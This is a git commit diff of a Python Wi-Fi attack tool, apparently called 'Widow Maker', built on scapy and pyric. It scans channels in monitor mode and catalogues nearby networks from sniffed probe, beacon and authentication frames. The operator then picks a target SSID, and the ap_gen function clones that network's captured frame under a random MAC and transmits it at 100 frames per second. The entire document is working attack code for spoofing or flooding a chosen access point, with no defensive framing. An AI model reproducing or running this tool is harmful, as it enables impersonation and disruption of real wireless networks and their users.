942dae960a95549e376469956b59b04438dce13c
violentshell <violentshell@github.com>
2016-10-05 20:11:31 +1030

    Updated sniffer function andmenu's

--- widow.py
+++ widow.py
@@ -1,62 +1,74 @@
 import time, threading, sys, os, random
 from scapy.all import *
 from termcolor import colored
+from multiprocessing import Queue
+import curses
 import select
 import pyric.pyw as pyw
 
-def ap_gen(SSID):
-    # Default 802.11 beacon packet, probably use the ap's with fake data to adapt better to changing networks TODO
-    ap_pkt = RadioTap(version = 0, pad = 0, len = 18, present = 'Flags+Rate+Channel+dBm_AntSignal+Antenna+b14', notdecoded= '\x00\x02\x99\t\xa0\x00\xbf\x01\x00\x00')
-    ap_pkt = ap_pkt/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
-    ap_pkt = ap_pkt/Dot11Beacon(cap='ESS')/Dot11Elt(ID="SSID", info=SSID+'1')
-    ap_pkt = ap_pkt/Dot11Elt(ID="Rates", info="/\x82\84\x0b\x16\"")/Dot11Elt(ID="DSset", info='\x03')/Dot11Elt(ID="TIM", info='\x00\x01\x00\x00')
 
-    # Loop while the thread is active, sending at rate
-    while True:
-        time.sleep(rate)
-        sendp(ap_pkt, count=1, iface="wlan0mon", verbose=False)
+
 
 #outside class because scapy doesn't play nice with self
-
-
-
-def sniffer(mode, minchannel, maxchannel):
+def sniffer(que, rque, minchannel, maxchannel):
     card = pyw.getcard('mon0')
-    while mode == 'Scanning':
-        channel = random.randint(minchannel, maxchannel)
-        pyw.chset(card, channel)
-        sniff(iface='mon0', prn=filter, timeout=0.3)
-        return channel
+    channel = que.get()
+    pyw.chset(card, channel)
+    sniff(iface='mon0', prn=filter, timeout=0.3)
+    rque.put(channel)
 
 def filter(pkt):
     if pkt.haslayer(Dot11Elt) and pkt[Dot11].type == 0 and pkt[Dot11].subtype in [5,8,11]:
-            SSID = (pkt[Dot11Elt].info).decode('utf-8')
-            if SSID != None and SSID != "" : #Testing purposes "and SSID[-1] != '1':"
-                if SSID not in clients.keys():
 
+            # Grab SSID
+            SSID = (pkt[Dot11Elt].info).decode('utf-8')
+
+            if SSID != None and SSID != "" :
+                if SSID not in clients.keys():
                     # Setup counters
-                    clients[SSID]['#'] = len(clients) +1
+                    clients[SSID]['#'] = len(clients)
+                    clients[SSID]['Channel'] = set([getchannel(pkt)])
                     clients[SSID]['Probes'] = 0
                     clients[SSID]['Beacons'] = 0
                     clients[SSID]['Auth'] = 0
                     clients[SSID]['Total'] = 0
+                    clients[SSID]['Sent'] = 0
 
                     # Capture MAC addresses
                     clients[SSID]['MAC'] = pkt[Dot11].addr2
 
-                    # Generate a random one too, Is this needed?
+                    # Generate a random one too,
                     clients[SSID]['RMAC'] = str(RandMAC())
 
-                    # Add the pkt for debugging
-                    clients[SSID]['PKT'] = pkt
                 elif pkt[Dot11].subtype == 5:
                     clients[SSID]['Probes'] +=1
+
                 elif pkt[Dot11].subtype == 8:
                     clients[SSID]['Beacons'] +=1
+
                 elif pkt[Dot11].subtype == 11:
                     clients[SSID]['Auth']  +=1
-                clients[SSID]['Total'] += 1
 
+                clients[SSID]['Channel'].add(getchannel(pkt))
+                clients[SSID]['Total'] += 1
+                clients[SSID]['PKT'] = pkt
+
+def getchannel(pkt):
+    # 802.11 Channel mappings
+    freqtochan = {2412: 1, 2417: 2, 2422: 3, 2427: 4, 2432: 5, 2437: 6, 2442: 7, 2447: 8,
+                  2452: 9, 2457: 10, 2562: 11, 2567: 12, 2572: 13, 2484: 14}
+
+    # The channel position in the not decoded bytes
+    raw = pkt[RadioTap].notdecoded[18:20]
+
+    # Classic little edian bytes, trying to ruin my day * [0] is because it returns a single element tuple
+    freq = struct.unpack('H', raw)[0]
+
+    # Check the mapping
+    if freq in freqtochan.keys():
+
+        # Return Channel if found
+        return freqtochan[freq]
 
 class Vividict(dict):
     def __missing__(self, key):
@@ -67,148 +79,143 @@ class widow():
     def __init__(self):
         self.wireless = pyw.getcard(sys.argv[1])
         self.channel = 1
-        self.minchannel = 1
-        self.maxchannel = 13
+        self.minchannel = 0
+        self.maxchannel = 12
         self.timeout = 5
-        self.monfaces = []
+        self.target = None
+        self.que = Queue()
+        self.rque = Queue()
         self.mode = 'Scanning'
         self.interface = 'mon0'
-        self.interface_setup()
+        self.monitor_interface_setup()
 
-    def interface_setup(self):
-        print('setting up interfaces')
-        if pyw.isinterface(self.interface):
-            pyw.devdel(pyw.getcard(self.interface))
-        pyw.devadd(self.wireless, self.interface,'monitor')
+    def monitor_interface_setup(self):
         card = pyw.getcard(self.interface)
-        pyw.chset(card, self.channel)
-        pyw.up(card)
+        if pyw.isinterface(self.interface):
+            try:
+                pyw.devdel(card)
+            except Exception as e:
+                sys.exit(e)
+        try:
+            pyw.devadd(self.wireless, self.interface,'monitor')
+            pyw.chset(card, self.channel)
+            pyw.up(card)
+        except Exception as e:
+            sys.exit(e)
 
     def scanner(self):
         while self.mode == 'Scanning':
             try:
                 self.printer()
-                self.channel = sniffer(self.mode, self.minchannel, self.maxchannel)
+                if self.que.empty():
+                    for i in range(1, 12):
+                        self.que.put(i)
+                t = threading.Thread(target=sniffer, args=(self.que, self.rque, self.minchannel, self.maxchannel,))
+                t.daemon = True
+                t.start()
+                self.channel = self.rque.get()
+                time.sleep(0.2)
             except KeyboardInterrupt:
                 self.mode = 'Select'
-        while self.mode == 'Select':
+
+        if self.mode == 'Select':
             try:
                 self.printer()
-                i, o, e = select.select([sys.stdin], [], [], 0.5)
-                self.target = int(sys.stdin.readline().strip())
-                for i in clients:
-                    if clients[i]['#'] == self.target:
-                        self.target = i
+                x = (input('SSID Selection: '))
+                for id in clients:
+                    if clients[id]['#'] == int(x):
+                        self.target = id
                         break
-                    else:
-                        self.target = None
-                if self.target == None:
+
+                if not isinstance(self.target, str):
                     print(colored('[!] Invalid Target Choice, Try Again' , 'red'))
-                    time.sleep(1.5)
+                    time.sleep(1)
+                    self.scanner()
                 else:
                     self.mode = 'Hunting'
                     self.hunting()
 
             except KeyboardInterrupt:
-                self.mode = 'None'
+                self.mode = 'Scanning'
 
     def hunting(self):
-        self.printer()
+        #self.monitor_interface_removal()
         t = threading.Thread(target=ap_gen, args=(self.target,))
         t.daemon = True
-        t.start
+        t.start()
+        try:
+            while True:
+                self.printer()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            return
 
     def printer(self):
-        #TODO, allow SSID selection on the fly. Then spin up new spoofing engines
         # Clear the screen whenever we print
         os.system('clear')
 
-
-        # Terminal size
-        rows, columns = os.popen('stty size', 'r').read().split()
+        # Terminal size 0 is rows, 1 is columns
+        columns = int(os.popen('stty size', 'r').read().split()[1])
 
         # Print the Banner
         for bannerline in banner.splitlines():
-            print(colored('{} {}', 'green').format(' '*(round(int(columns)/2-35)), bannerline))
+            print(colored('{} {}', 'green').format(' '*(round(columns/2-35)), bannerline))
 
         # Print the info summary
-        print('#'*int(columns))
+        print('#' * columns)
         print(colored('CURRENT STATUS: {} {}','blue').format(self.mode, '[CTRL-C TO STOP]'))
 
         # Each Mode
+        if self.mode == 'Hunting':
+            print(colored('[*] Beacon Frame Rate:  {} frames p/s', 'green').format(100))
+            print(colored('[*] Target Access Point: {} ', 'green').format(self.target))
+            print(colored('[*] Current Channel: {}', 'green').format(self.channel))
+            print('#' * columns)
+            print(colored('{:20} {:20} {:20} {:20} {:20}', 'blue').format('SSID:', 'MAC:', 'RMAC', 'SENT', 'CHANNELS'))
+            for i in sorted(clients):
+                if self.mode == 'Hunting' and i == self.target:
+                    print(colored('{:20} {:20} {:20} {:<20} {!s:20}', 'red')
+                          .format(i, clients[i]['MAC'], clients[i]['RMAC'], clients[i]['Sent'], clients[i]['Channel']))
+            return
+
         if self.mode == 'Scanning':
             print(colored('[*] Current Channel: {}', 'green').format(self.channel))
-            print('#' * int(columns))
-            print(colored('SSID:\t\t\t' + 'MAC:\t\t\t'  + 'FRAMES:\t\t\t','blue'))
 
-        elif self.mode == 'Select':
-            print('#' * int(columns))
+        if self.mode == 'Select':
             print(colored('[*] Please make a selection from the below SSIDs:', 'green'))
-            print(colored('SSID:\t\t\t' + 'MAC:\t\t\t', 'blue'))
 
-        elif self.mode == 'Hunting':
-            print(colored('[*] Beacon Frame Rate: \t\t\t {} frames p/s', 'green').format(rate * int(sys.argv[2])))
-            print(colored('[*] Target Access Point: \t\t ' + self.target, 'green'))
-            print('#' * int(columns))
-            print(colored('TARGET:\t\t\t' + 'MAC:\t\t\t' + 'FAKE MAC:\t\t\t', 'blue'))
-        self.client_tab_foo()
-
-    def client_tab_foo(self):
+        print('#' * columns)
+        print(colored('{:^3} {:20} {:20} {:20} {:20} ', 'blue').format('#', 'SSID:', 'MAC:', 'FRAMES:', 'CHANNELS:'))
         for i in sorted(clients):
-            # Tab foo!
-            if len(str(i)) <= 3:
-                tab = 3
-            elif len(str(i)) <= 10:
-                tab = 2
-            elif len(str(i)) <= 15:
-                tab = 1
-            else:
-                tab = 0
+            print(colored('[{}] {:20} {:20} {:<20} {!s:20}', 'red')
+                  .format(clients[i]['#'], i, clients[i]['MAC'], clients[i]['Total'], clients[i]['Channel']))
 
-            if self.mode == 'Scanning':
-                print(colored('[{}] {} {} {} {} {}', 'red').format(clients[i]['#'], i, '\t'*tab, clients[i]['MAC'],'\t', clients[i]['Total']))
+def ap_gen(SSID):
+    # Copy so we leave orig intact
+    ap_pkt = copy.deepcopy(clients[SSID]['PKT'])
+    ap_pkt[Dot11].addr2 = clients[SSID]['RMAC']
+    ap_pkt[Dot11].addr3 = clients[SSID]['RMAC']
 
-            elif self.mode =='Select':
-                print(colored('[{}] {} {} {} ','red').format(clients[i]['#'], i, '\t'*tab, clients[i]['MAC']))
+    # Loop while the thread is active, sending at rate
+    while True:
+        time.sleep(1)
+        sendp(ap_pkt, count=100, iface='mon0', verbose=False)
+        clients[SSID]['Sent'] += 100
 
-            elif self.mode == 'Hunting' and i == self.target:
-                print(colored('{} {} {} {} {}', 'red').format(i, '\t' * tab, clients[i]['MAC'], '\t', clients[i]['RMAC']))
+if __name__ == '__main__':
+    banner = '''
+     __    __ _     _                              _
+    / / /\ \ (_) __| | _____      __   /\/\   __ _| | _____ _ __
+    \ \/  \/ / |/ _` |/ _ \ \ /\ / /  /    \ / _` | |/ / _ \ '__|
+     \  /\  /| | (_| | (_) \ V  V /  / /\/\ \ (_| |   <  __/ |
+      \/  \/ |_|\__,_|\___/ \_/\_/   \/    \/\__,_|_|\_\___|_|
+      '''
 
+    try:
+        interf = sys.argv[1]
+    except:
+        sys.exit(colored('[!] Need interface', 'red'))
 
-# Setup dicts for later use
-global rate, clients, number
-
-
-# Dear lord this is ugly.
-banner = ''' __    __ _     _                              _
-/ / /\ \ (_) __| | _____      __   /\/\   __ _| | _____ _ __
-\ \/  \/ / |/ _` |/ _ \ \ /\ / /  /    \ / _` | |/ / _ \ '__|
- \  /\  /| | (_| | (_) \ V  V /  / /\/\ \ (_| |   <  __/ |
-  \/  \/ |_|\__,_|\___/ \_/\_/   \/    \/\__,_|_|\_\___|_|
-  '''
-
-
-try:
-    interf = sys.argv[1]
-except:
-    sys.exit(colored('[!] Need interface', 'red'))
-
-
-# Sets custom rate or uses default perhaps TODO
-try:
-    rate = float(60)/int(sys.argv[2])
-except:
-    sys.exit(colored('[!] Need rate', 'red'))
-
-# Basically a loading screen. Actually, add a proper loading bar in later TODO
-number = 0
-clients = Vividict()
-main = widow()
-main.scanner()
-# try:
-#     # Sniff on said interface and send packets to the filtering engine
-#     main.scanner()
-#
-# except(KeyboardInterrupt, SystemExit):
-#     # Something terrible has happened, please not the ascii art
-#     print('Goodbye')
+    clients = Vividict()
+    main = widow()
+    main.scanner()
